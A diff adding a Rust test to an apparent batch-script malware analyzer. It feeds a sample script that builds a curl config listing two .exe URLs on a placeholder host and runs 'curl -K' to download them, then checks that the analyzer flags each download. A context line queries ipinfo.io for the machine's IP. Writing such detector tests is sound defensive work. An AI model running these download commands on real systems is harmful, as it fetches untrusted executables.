@@ -18528,6 +18528,48 @@ mod curl_tests {
     }
 
     #[test]
+    fn curl_config_file_multiple_urls_emit_structured_downloads() {
+        let report = crate::analyze(
+            br#"echo url = "https://curl-config-multi.example/a.exe"> curl.cfg
+echo url = "https://curl-config-multi.example/b.exe">> curl.cfg
+curl -K curl.cfg
+"#,
+            &Config::default(),
+        );
+
+        for expected in [
+            "https://curl-config-multi.example/a.exe",
+            "https://curl-config-multi.example/b.exe",
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Download { src, dst, .. } if src == expected && dst.is_none()
+                )),
+                "curl config multi-URL source {expected} not structured: {:?}\n{}",
+                report.traits,
+                report.deobfuscated
+            );
+        }
+        let generic_count = report
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src.contains("curl-config-multi.example")
+                )
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "curl config multi-URL left generic duplicates: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
     fn curl_preserves_single_percent_variable_url_template() {
         let mut env = Environment::new(&Config::default());
         interpret_line(r#"curl -s "https://ipinfo.io/%IP_ADDRESS%/json""#, &mut env);
